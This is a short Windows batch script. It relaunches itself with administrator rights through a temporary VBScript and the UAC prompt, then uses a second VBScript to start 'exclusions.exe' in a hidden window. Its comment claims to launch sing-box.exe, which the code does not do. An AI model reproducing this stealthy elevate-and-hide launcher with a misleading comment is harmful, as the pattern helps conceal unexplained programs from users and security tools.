@echo off
chcp 65001
setlocal EnableDelayedExpansion

:: Check for administrator privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

:: If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: Add current directory to PATH environment variable
set PATH=%PATH%;%CD%

:: Create VBScript file to run sing-box.exe in the background
echo Set WshShell = CreateObject("WScript.Shell")>%temp%\exclusions.vbs
echo WshShell.Run "exclusions.exe", 0, False>>%temp%\exclusions.vbs

:: Run VBScript file in hidden mode
start /min wscript.exe //nologo %temp%\exclusions.vbs